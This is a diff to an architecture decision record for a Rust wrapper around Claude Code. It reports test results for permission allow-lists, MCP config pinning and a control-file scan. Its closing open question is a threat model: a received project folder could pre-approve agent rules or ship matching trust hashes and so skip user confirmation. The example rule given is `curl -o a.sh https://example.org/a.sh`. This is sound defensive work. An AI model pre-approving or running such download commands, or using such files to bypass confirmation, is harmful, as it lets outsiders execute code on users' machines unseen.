@@ -127,3 +127,94 @@ Code mods (they run inside Claude Code's process, plan section 7); provider-key 
 
 `crates/rcfd-claude/src/{allow,driver,lib}.rs` and a new `src/trust.rs`, new tests; `crates/rcfd-studio/src/chat*.rs` and tests;
 this ADR.
+
+## Amendment 1 (2026-10-28, library part, registered before the corrected run)
+
+First registered run of the library checks (release, `target-w48e`, worktree at main 3492c75 plus the uncommitted library
+code): E4, E9 and every ADR 0126 / 0128 test passed; **E5 failed**. The tampered rule inserted as line 6 was refused, but
+reported at line 7, column 4. Cause, in the implementation and not in the test: the first version validated each rule
+inside serde deserialization. serde_json gives such an error a position only after its end-of-array check has consumed the
+following `,` and whitespace, so the position is that of the next element. Correction: the file is parsed first
+(rules as strings), then each rule is validated and a refusal is located by a scan of the parsed text for the line and
+column of that array element (`allow::rule_positions`). The E5 limit ("refused with the line number") and the test are
+unchanged; the corrected run follows this amendment. (This text was written into the file before the corrected run but
+committed afterwards, in the addendum commit 9e870cc.) The rule that a missed limit becomes a `*_known_miss` test was not
+applied, because the miss was a defect in new code, not a limit that the code cannot meet; the maintainer is asked to
+confirm this or have it converted.
+
+## Addendum: library part, results against the registered limits (2026-10-28)
+
+Branch `worktree-agent-a99d9f825a90b2d6c` on main 3492c75. Commits: 0a3a2ac (edge `rcfd-claude -> rcfd-project`, layer 2 in
+`workspace_graph.rs` and `docs/architecture.md`), 16fa6f5 (allow-list file, first list, MCP pinning), 50d6264 (tests),
+cb92479 (control-file scan). Runs: `cargo test --release -p rcfd-claude -- --nocapture` with `CARGO_TARGET_DIR=target-w48e`,
+`CARGO_BUILD_JOBS=2`, Windows 11; clippy `-p rcfd-claude --all-targets -D warnings` clean before each run. Run 1 is described in
+Amendment 1; run 2 (the corrected run, code of 50d6264) and run 3 (cb92479, adds the scan) passed every test.
+
+What was built (additive; `Claude::new` and `check_args` give the same results as before):
+* `allow::ALLOW_FILE` (`.rcfd/claude-allow.json`), `AllowList::{from_file, to_file, from_file_bytes, to_file_bytes, file_of,
+  project_initial}`. The file is `{"version": 1, "rules": [<flag values>]}`, one rule per line, written with
+  `rcfd_project::atomic::atomic_write` (its folder is created). On load every rule goes through the policy of
+  `AllowList::add`; one bad rule, an unknown key, another version or broken JSON refuses the whole file
+  (`Error::AllowFile` with line and column). `./` anchors are normalised so a list read back equals the list written.
+* `project_initial()`: the 11 read-class tools of ADR 0135 as `mcp__rcfd_project__<tool>` (`allow::PINNED_SERVER`
+  = `rcfd_project`), nothing else.
+* `Claude::mcp_config: Option<PathBuf>` (`None` from `Claude::new`): when set, `chat_args` puts
+  `--strict-mcp-config --mcp-config <file>` before the permission flags. `allow::check_args_in(args, project)` = `check_args` plus:
+  each flag at most once and only in that spelling (no `=` form); `--mcp-config` only with `--strict-mcp-config` and
+  exactly one value; the value must be an absolute path of an existing file outside the project, both lexically and after
+  `rcfd_project::paths::canonicalize`; inline JSON is refused. Every spawn now runs `check_args_in`. `allow::pinned_mcp_config`
+  writes the app-owned config text (one stdio server, `rcfd-mcp --project <dir> --root <dir>`).
+* `trust::scan(project)`: `.mcp.json`, `CLAUDE.md`, and everything under `.claude/` or `.claude-plugin/`, at any depth, in any
+  ASCII case, with `fnv64` hashes; links are listed and never followed; an unreadable folder is an error. This is not a gate:
+  see the open question below.
+
+| Check | Part | Limit | Result |
+|---|---|---|---|
+| E1 | integration | panel model of the session list | not run (needs the 48B panel model) |
+| E2 | integration | open session refused in the model, no process | not run (panel model); the library refusal is ADR 0126 D2, passes unchanged |
+| E3 | integration | resume, argv, text, cost shown | not run (panel); library side is ADR 0126 D1-D4, passes unchanged |
+| E4 | library: file and argv | suggestion `Edit(other.txt)`; file +1 rule; next argv has it and `--permission-mode dontAsk --permission-prompts none` after the fixed flags; `.mcp.json` suggestion `None` | **pass**: `Edit(./other.txt)`; file 12 -> 13 rules; argv rules 12 -> 13, permission flags at positions 7-10 (once); `.mcp.json` -> `None`. "Shown" and the button: not run (panel) |
+| E5 | library | exact round trip; bare `Bash`, a bypass token, `Edit(.rcfd/x)` refused with the line number; nothing passed; valid file accepted | **pass** (run 2, after Amendment 1): round trip equal and byte-identical on rewrite; the 3 tampered files refused at line 6 (the inserted line); `from_file` returns no list; the valid file is accepted. Not registered, also refused: two rules on one line (line 6), version 2 (line 2), unknown key (line 2), truncated JSON |
+| E6 | integration | cancel from the panel | not run (panel); ADR 0126 D5: both pids gone 0.527 s after cancel started (run 2) |
+| E7 | integration | mirror within 2.0 s | not run (panel); ADR 0126 P3 passes unchanged |
+| E8 | library + integration | no chat until the folder is confirmed | **not run: blocked by the open question below**; only the scan exists, with unregistered tests |
+| E9 | library | argv has `--strict-mcp-config --mcp-config <outside>`; refused inside or without `--strict-mcp-config`; T3 space clean; `--mcp-config ./.mcp.json` refused | **pass, against `check_args_in`** (the limit names `check_args`, which has no project path and keeps its ADR 0126 behaviour: alone it still accepts these flags; every spawn runs `check_args_in`): recorded argv equals `Chat::args` and has the triple once; 14 refusals on Windows (relative `./.mcp.json`, `.mcp.json`, `../x`; absolute inside; lexically inside through `sub/..`; other ASCII case; no `--strict-mcp-config`; inline JSON; both `=` forms; two values; flag twice; no value; missing file); accepted: sibling `my-proj2`, the config through `<proj>/..`, `--strict-mcp-config` alone; a config inside the project starts no process; T3 space with pinning 7469 lists (10 203 distinct rules), none refused or carrying a bypass token; T3's 15 bad lists still refused; ADR 0126 T3 itself unchanged and passing. Not registered: a link outside pointing into the project is refused |
+| E10 | integration | frame build <= 8 ms | not run (panel) |
+| H1-H5 | by hand | real Claude Code session | not run (need a real session and a person) |
+
+ADR 0126 and 0128 tests: all pass unchanged (lib 10 + 2 new scan tests, `driver_fake` 7, `driver_init_wfix` 2,
+`fixtures_v2_1_310` 6, `real_cli` 3 ignored).
+
+Deviations:
+* Amendment 1: the first run failed E5 because of a wrong line from the implementation; fixed and re-run as registered.
+* `cargo fmt --all` fails on this machine with "The filename or extension is too long (os error 206)"; `cargo fmt -p rcfd-claude`
+  was used.
+* `crates/rcfd-cli/tests/workspace_graph.rs` was edited (rcfd-claude at layer 2) but not run: the run was limited to
+  `-p rcfd-claude`. `cargo metadata` shows the only new edge is `rcfd-claude -> rcfd-project` (layer 1) and that no crate
+  depends on `rcfd-claude`. ADR 0130 48A edits the same table line (rcfd-runner), so the two branches conflict there.
+* Dependencies: no new third-party crate (Cargo.lock adds no package). Direct dependencies added: `serde` (workspace, already
+  in the tree through `serde_json`) and `rcfd-project` (path).
+* API: the new `Error::AllowFile` variant and the public field `Claude::mcp_config` break exhaustive matches and struct
+  literals outside the crate; there are no such users today.
+* Not done: merging the ADR 0128 finding 10 tests of both crates into one (the ADR says the edge makes it possible; removing a
+  test is not additive).
+
+**Open question (blocks E8 and the gate; not decided here).** W48-10 (b) keeps the confirmed hashes in `.rcfd/claude-trust.json`,
+inside the project. A folder received from someone else can ship that file already holding the right hashes of its own
+`.mcp.json` and hooks, so the chat would start without a confirmation. The same holds for `.rcfd/claude-allow.json`: a received
+folder can pre-approve rules the user never saw (for example `Bash(curl -o a.sh https://example.org/a.sh)`, which the policy
+accepts). `.rcfd/` being a control path only stops Claude from editing these files, not the sender. Options:
+* (a) keep the trust record in the Studio's config folder, keyed by the canonical project path; ignore any record in the folder;
+* (b) keep `.rcfd/claude-trust.json` but require a matching per-user record (or a per-user secret) as well;
+* (c) in addition to (a) or (b), list `.rcfd/claude-allow.json` with the control files, so a received list is confirmed
+  before its first use (the Studio updates the record when the user clicks "allow").
+Related points for the same decision: `fnv64` is not collision-resistant, so someone who controls a later update of the folder
+(for example through `git pull`) can make a changed file keep its hash; a cryptographic hash would need a new crate (for
+example `sha2`, MIT/Apache-2.0). The ADR list leaves out `CLAUDE.local.md` and `CLAUDE.md` files in folders above the project,
+which Claude Code also reads according to its memory documentation (from prior reading, not re-read for this addendum,
+not observed). `check_args_in` does not refuse `--plugin-dir` and similar flags,
+because the ADR does not list them; the driver never generates them. Should `check_args` itself also refuse the
+project-independent MCP forms (relative path, inline JSON, `=` forms, several values, `--mcp-config` without
+`--strict-mcp-config`)? It was left unchanged so that existing callers get the same verdicts. The outside-the-project check
+compares paths lexically and after `canonicalize`; it does not detect hard links or UNC aliases (`\\localhost\E$\...`) of a file
+in the project. The Studio chooses the config path, so this is a stated limit, not a hole a received folder can use.
